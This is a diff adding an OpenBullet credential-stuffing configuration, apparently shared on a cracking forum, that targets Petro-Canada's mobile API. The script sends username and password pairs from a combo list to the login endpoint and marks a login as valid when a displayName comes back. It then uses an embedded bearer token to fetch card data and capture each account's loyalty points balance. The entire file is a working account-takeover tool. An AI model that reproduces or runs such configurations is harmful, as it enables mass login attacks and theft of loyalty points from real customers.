@@ -1,0 +1,74 @@
+[SETTINGS]
+{
+  "Name": "PETROCANADA",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-03-02T21:22:51.743265-05:00",
+  "AdditionalInfo": "",
+  "Author": "SLAYA ON C.TO",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://mfp.petro-canada.ca:443/mfp/api/preauth/v1/preauthorize" 
+  CONTENT "{\"client_id\":\"354bafe4-6aaa-4810-859b-16d4a1d9e391\",\"scope\":\"RegisteredClient UserLogin\",\"challengeResponse\":{\"UserLogin\":{\"password\":\"<PASS>\",\"email\":\"<USER>\"}}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Cookie: __cfduid=<COOKIES(__cfduid)>" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "displayName\":" 
+  KEYCHAIN Failure OR 
+    KEY "Bad password or account not found" 
+
+PARSE "<SOURCE>" LR "" "" -> VAR "" 
+
+REQUEST GET "https://mfp.petro-canada.ca:443/mfp/api/adapters/suncor/v3/cards" 
+  
+  HEADER "Authorization: Bearer eyJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsImtpZCI6IjM1NGJhZmU0LTZhYWEtNDgxMC04NTliLTE2ZDRhMWQ5ZTM5MSIsIm4iOiJBTTBEZDd4QWR2NkgteWdMN3I4cUNMZEUtM0kya2s0NXpnWnREZF9xczhmdm5ZZmRpcVRTVjRfMnQ2T0dHOENWNUNlNDFQTXBJd21MNDEwWDlJWm52aHhvWWlGY01TYU9lSXFvZS1ySkEwdVp1dzJySGhYWjNXVkNlS2V6UlZjQ09Zc1FOLW1RSzBtZno1XzNvLWV2MFVZd1hrU093QkJsMUVocUl3VkR3T2llZzJKTUdsMEVYc1BaZmtOWkktSFU0b01paS1Uck5MelJXa01tTHZtMDloTDV6b3NVTkExNXZlQ0twaDJXcG1TbTJTNjFuRGhIN2dMRW95bURuVEVqUFk1QW9oMmluSS0zNlJHWVZNVVViTzQ2Q3JOVVl1SW9iT2lYbEx6QklodUlDcGZWZHhUX3g3c3RLWDVDOUJmTVRCNEdrT0hQNWNVdjdOejFkRGhJUHU4PSJ9fQ.eyJpc3MiOiJjb20uaWJtLm1mcCIsInN1YiI6IjM1NGJhZmU0LTZhYWEtNDgxMC04NTliLTE2ZDRhMWQ5ZTM5MSIsImF1ZCI6ImNvbS5pYm0ubWZwIiwiZXhwIjoxNTgzMjA1MjM0OTc1LCJzY29wZSI6IkxvZ2dlZEluIFJlZ2lzdGVyZWRDbGllbnQifQ.s85yuOiff7cUgmTYi33-3HZ2-Cc-7nyS3wF6upWYtDqW91QMGmEtyzooty5MtLWMYDJMtis-MV6lRyNmNns0SUjYxH8SwL62y0k46YS2tgYNdbTZ1hosj5LsXPt_SYd8eTGNT9MEz-ujjob4dKYILQ1Z5mTq5giNba5IuP2C1sLYVmWKNtCSEioGNSGSXzv80XO3HwPohnUg-_Z8ai2Nczu0w9_qEA9v7jaqM68yfByB4TvdcIQzWxFioq3CVEwT5yN2SDxyo27doiVRkElWTlXQPXybx0BoqbXFEgeTRXrby7plm-b7jEeyIDpxh6AfYfnNO7veeQv0rqU5kCXVKA" 
+
+PARSE "<SOURCE>" LR "\"pointsBalance\": " "," CreateEmpty=FALSE -> CAP "POINTS" 
+
